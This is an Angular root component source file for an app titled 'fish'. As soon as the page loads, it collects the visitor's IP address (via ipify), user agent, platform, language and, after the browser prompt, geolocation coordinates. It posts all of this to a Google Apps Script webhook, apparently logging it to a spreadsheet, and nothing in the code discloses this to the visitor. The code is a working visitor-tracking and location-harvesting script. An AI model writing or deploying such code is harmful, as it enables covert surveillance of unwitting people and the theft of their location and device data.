import { HttpClient, HttpHeaders } from '@angular/common/http';
import { Component } from '@angular/core';
import { RouterOutlet } from '@angular/router';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [RouterOutlet],
  templateUrl: './app.component.html',
  styleUrl: './app.component.css'
})
export class AppComponent {

  constructor(private http: HttpClient) {}
  title = 'fish';

  ngOnInit(): void {
    this.getUserIp("main");
  }

  getUserIp(action:string) {
    this.http.get<{ip: string}>('https://api.ipify.org?format=json').subscribe(data => {
      
      console.log('IP Address:', data.ip);
      const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;

    console.log('User Agent: ', userAgent);
    console.log('Platform: ', platform);
    console.log('Language: ', language);

    const userInfo = {
      ip: data.ip,
      userAgent: userAgent,
      platform: platform,
      language: language,
      latitude: 0,
      longitude: 0,
      action: action
    };

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(position => {
        userInfo.latitude = position.coords.latitude;
        userInfo.longitude = position.coords.longitude;
        console.log('Latitude: ', position.coords.latitude);
        console.log('Longitude: ', position.coords.longitude);
        this.sendDataToGoogleSheet(userInfo);
      });
    } else {
      console.log('Geolocation is not supported by this browser.');
      this.sendDataToGoogleSheet(userInfo);
    }
    

    });
  }

  sendDataToGoogleSheet(userInfo: any) {
    const headers = new HttpHeaders({
    'Content-Type': 'application/json'
  });
    const googleSheetUrl = 'https://script.google.com/macros/s/AKfycbzBO71ZLU1VdRDsYhXD6Ol_hnZAoePJT1WtyZfSnR8M9ngXA03ZE-DXAIgQNwa93dPM/exec'; // URL для вебхука Google Sheets
    this.http.post(googleSheetUrl, userInfo, { headers: headers }).subscribe(response => {
      console.log('Data sent to Google Sheet:', response);
    }, error => {
      console.error('Error sending data to Google Sheet:', error);
    });
  }

}
